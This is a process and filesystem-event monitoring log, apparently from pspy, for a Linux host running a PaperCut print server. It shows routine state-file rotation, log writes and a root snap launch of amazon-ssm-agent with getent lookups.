2026/03/21 06:45:28 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:28 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:28 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:28 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:28 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:28 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:28 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/held-jobs.new.ser
2026/03/21 06:45:28 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/held-jobs.curr.ser
2026/03/21 06:45:28 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:28 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:28 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:28 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:28 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:28 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/web-print.new.ser
2026/03/21 06:45:28 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/web-print.curr.ser
2026/03/21 06:45:28 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:28 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:28 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:28 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:28 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:28 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/device-txns.new.ser
2026/03/21 06:45:28 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/device-txns.curr.ser
2026/03/21 06:45:28 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:29 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:29 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:30 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:30 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:30 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:30 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:30 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:30 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:30 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:30 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:30 FS:                 OPEN | /etc/environment
2026/03/21 06:45:30 FS:               ACCESS | /etc/environment
2026/03/21 06:45:30 FS:        CLOSE_NOWRITE | /etc/environment
2026/03/21 06:45:30 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:30 CMD: UID=0     PID=33300  | 
2026/03/21 06:45:30 FS:                 OPEN | /usr/bin/snap
2026/03/21 06:45:30 FS:               ACCESS | /usr/bin/snap
2026/03/21 06:45:30 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:30 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:30 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:30 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:30 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:30 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:30 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:30 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:30 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:30 FS:                 OPEN | /usr/lib/os-release
2026/03/21 06:45:30 FS:               ACCESS | /usr/lib/os-release
2026/03/21 06:45:30 FS:        CLOSE_NOWRITE | /usr/lib/os-release
2026/03/21 06:45:30 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:30 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:30 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:30 FS:        CLOSE_NOWRITE | /usr/bin/snap
2026/03/21 06:45:30 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:30 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:30 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:30 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:30 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:30 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/os-release
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/os-release
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/os-release
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:                 OPEN | /etc/fstab
2026/03/21 06:45:31 FS:               ACCESS | /etc/fstab
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/fstab
2026/03/21 06:45:31 CMD: UID=0     PID=33312  | 
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:                 OPEN | /var/lib/snapd/system-key
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/system-key
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /var/lib/snapd/system-key
2026/03/21 06:45:31 FS:                 OPEN | /var/lib/snapd/inhibit/amazon-ssm-agent.lock
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/amazon-ssm-agent_11797.snap
2026/03/21 06:45:31 FS:                 OPEN | /var/lib/snapd/sequence/amazon-ssm-agent.json
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/sequence/amazon-ssm-agent.json
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /var/lib/snapd/sequence/amazon-ssm-agent.json
2026/03/21 06:45:31 CMD: UID=0     PID=33317  | /usr/bin/snap run amazon-ssm-agent 
2026/03/21 06:45:31 FS:                 OPEN | /usr/bin/getent
2026/03/21 06:45:31 FS:               ACCESS | /usr/bin/getent
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/locale-archive
2026/03/21 06:45:31 FS:                 OPEN | /etc/locale.alias
2026/03/21 06:45:31 FS:               ACCESS | /etc/locale.alias
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/locale.alias
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:31 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:31 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:31 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:31 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:31 FS:                 OPEN | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:               ACCESS | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:31 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/bin/getent
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2026/03/21 06:45:31 CMD: UID=0     PID=33318  | /usr/bin/getent passwd 0 
2026/03/21 06:45:31 FS:                 OPEN | /usr/bin/getent
2026/03/21 06:45:31 FS:               ACCESS | /usr/bin/getent
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/locale-archive
2026/03/21 06:45:31 FS:                 OPEN | /etc/locale.alias
2026/03/21 06:45:31 FS:               ACCESS | /etc/locale.alias
2026/03/21 06:45:31 CMD: UID=0     PID=33319  | 
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/locale.alias
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:31 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:31 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:31 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:31 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:31 FS:                 OPEN | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:               ACCESS | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:31 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/bin/getent
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2026/03/21 06:45:31 FS:                 OPEN | /usr/bin/getent
2026/03/21 06:45:31 FS:               ACCESS | /usr/bin/getent
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:                 OPEN | /etc/ld.so.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/locale-archive
2026/03/21 06:45:31 FS:                 OPEN | /etc/locale.alias
2026/03/21 06:45:31 FS:               ACCESS | /etc/locale.alias
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/locale.alias
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:31 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:31 FS:             OPEN DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:31 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES
2026/03/21 06:45:31 FS:    CLOSE_NOWRITE DIR | /usr/lib/locale/C.utf8/LC_MESSAGES/
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:31 FS:                 OPEN | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:               ACCESS | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/nsswitch.conf
2026/03/21 06:45:31 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:31 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/bin/getent
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_IDENTIFICATION
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MEASUREMENT
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TELEPHONE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_ADDRESS
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NAME
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_PAPER
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MESSAGES/SYS_LC_MESSAGES
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_MONETARY
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_COLLATE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_TIME
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_NUMERIC
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/C.utf8/LC_CTYPE
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /var/lib/snapd/inhibit/amazon-ssm-agent.lock
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:                 OPEN | /var/lib/snapd/seccomp/bpf/snap.amazon-ssm-agent.amazon-ssm-agent.bin2
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/seccomp/bpf/snap.amazon-ssm-agent.amazon-ssm-agent.bin2
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /var/lib/snapd/seccomp/bpf/snap.amazon-ssm-agent.amazon-ssm-agent.bin2
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:               ACCESS | /var/lib/snapd/snaps/snapd_25202.snap
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/os-release
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/os-release
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/os-release
2026/03/21 06:45:31 FS:                 OPEN | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:               ACCESS | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/lib/snapd/info
2026/03/21 06:45:31 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:31 FS:                 OPEN | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:31 FS:               ACCESS | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:                 OPEN | /etc/passwd
2026/03/21 06:45:31 FS:               ACCESS | /etc/passwd
2026/03/21 06:45:31 FS:        CLOSE_NOWRITE | /etc/passwd
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:31 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:31 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:32 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:32 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:32 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:32 FS:             OPEN DIR | /home/papercut/server
2026/03/21 06:45:32 FS:             OPEN DIR | /home/papercut/server/
2026/03/21 06:45:32 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:32 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:32 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:32 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:32 FS:    CLOSE_NOWRITE DIR | /home/papercut/server
2026/03/21 06:45:32 FS:    CLOSE_NOWRITE DIR | /home/papercut/server/
2026/03/21 06:45:33 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:33 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:34 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:34 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:34 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:34 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:34 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:34 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:34 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:34 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:34 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:34 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:34 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:34 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:34 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:34 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:34 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:34 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
